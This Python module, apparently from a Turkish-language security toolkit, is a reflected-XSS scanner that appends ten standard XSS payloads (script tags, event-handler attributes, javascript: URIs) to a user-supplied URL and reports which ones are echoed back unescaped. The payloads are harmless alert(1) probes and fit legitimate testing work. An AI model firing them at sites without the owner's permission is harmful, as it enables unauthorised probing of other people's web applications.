import requests
from rich.console import Console
from rich.table import Table

console = Console()

XSS_PAYLOADS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>", "'\"><script>alert(1)</script>",
    "<body onload=alert(1)>", "<input onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>", "<details open ontoggle=alert(1)>",
    "javascript:alert(1)", "<iframe src='javascript:alert(1)'>",
]

def run():
    url = console.input("[bold white]  Hedef URL: [/]").strip()
    if not url:
        console.print("[red]  URL bos olamaz.[/]")
        return

    console.print(f"[#818cf8]  XSS testi: {url}[/]")
    table = Table(title="🔓 XSS Scanner", border_style="#818cf8", header_style="bold #a5b4fc")
    table.add_column("Payload", style="dim", min_width=30)
    table.add_column("Yansidi", style="bold")

    reflected = 0
    for payload in XSS_PAYLOADS:
        test_url = url + payload if "?" in url else url + "?q=" + payload
        try:
            r = requests.get(test_url, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
            if payload in r.text:
                table.add_row(payload[:35], "[red]EVET[/]")
                reflected += 1
            else:
                table.add_row(payload[:35], "[green]Hayir[/]")
        except Exception:
            table.add_row(payload[:35], "[dim]Hata[/]")

    console.print()
    console.print(table)
    console.print(f"\n[#818cf8]  {reflected} payload yansidi.[/]")
